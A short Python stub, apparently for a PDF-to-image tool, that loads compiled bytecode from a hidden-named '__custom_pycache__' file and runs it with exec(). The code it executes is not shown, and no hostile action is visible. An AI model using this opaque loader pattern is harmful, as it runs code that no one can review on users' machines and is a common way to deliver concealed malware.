
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfToImage_ec77b0076ab648bcb2e931d1f802d49f.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
